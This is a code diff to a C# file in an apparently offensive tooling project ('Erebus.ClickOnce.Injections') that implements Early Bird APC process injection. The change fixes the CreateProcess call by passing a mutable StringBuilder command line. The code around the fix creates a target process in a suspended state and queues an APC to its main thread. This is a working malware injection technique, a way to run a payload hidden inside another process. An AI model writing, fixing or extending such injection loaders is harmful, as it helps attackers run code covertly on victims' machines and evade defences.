@@ -1,7 +1,6 @@
-using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
+using System.Text;
 
 namespace Erebus.ClickOnce.Injections
 {
@@ -34,16 +33,20 @@ namespace Erebus.ClickOnce.Injections
             try
             {
                 string targetProcess = InjectionConfig.TargetProcess;
-                
+
                 // Start target process in suspended state
                 Win32.STARTUPINFO si = new Win32.STARTUPINFO();
                 si.cb = Marshal.SizeOf(si);
                 Win32.PROCESS_INFORMATION pi;
 
                 DebugLogger.WriteLine($"[+] Creating suspended process: {targetProcess}");
+
+                // Mutable command line buffer required for CreateProcessW
+                StringBuilder cmdLine = new StringBuilder(targetProcess);
+
                 bool success = Win32.CreateProcess(
                     null!,
-                    targetProcess,
+                    cmdLine,
                     IntPtr.Zero,
                     IntPtr.Zero,
                     false,
@@ -107,7 +110,7 @@ namespace Erebus.ClickOnce.Injections
                 // Queue APC to main thread (Early Bird)
                 DebugLogger.WriteLine("[+] Queueing APC to main thread...");
                 uint apcResult = QueueUserAPC(baseAddress, pi.hThread, IntPtr.Zero);
-                
+
                 if (apcResult == 0)
                 {
                     DebugLogger.WriteLine($"[-] QueueUserAPC failed: {Marshal.GetLastWin32Error()}");
